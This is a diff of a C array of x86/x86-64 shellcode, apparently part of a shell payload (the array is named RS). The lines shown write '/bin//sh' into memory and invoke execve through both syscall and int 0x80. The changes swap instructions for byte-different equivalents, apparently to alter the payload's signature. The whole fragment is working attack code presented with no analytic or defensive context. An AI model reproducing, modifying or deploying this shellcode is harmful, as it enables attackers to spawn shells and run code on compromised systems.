@@ -67,10 +67,10 @@ char RS[] = {
   /* 0067 */ "\x5f"                         /* pop rdi                         */
   /* 0068 */ "\xc7\x07\x2f\x62\x69\x6e"     /* mov dword [rdi], 0x6e69622f     */
   /* 006E */ "\xc7\x47\x04\x2f\x2f\x73\x68" /* mov dword [rdi+0x4], 0x68732f2f */
-  /* 0075 */ "\x40\x75\x04"                 /* jnz 0x7c                        */
+  /* 0075 */ "\x48\x78\x04"                 /* js 0x7c                         */
   /* 0078 */ "\xb0\x3b"                     /* mov al, 0x3b                    */
   /* 007A */ "\x0f\x05"                     /* syscall                         */
   /* 007C */ "\x31\xc9"                     /* xor ecx, ecx                    */
-  /* 007E */ "\xb0\x0b"                     /* mov al, 0xb                     */
+  /* 007E */ "\x04\x0c"                     /* add al, 0xc                     */
   /* 0080 */ "\xcd\x80"                     /* int 0x80                        */
 };
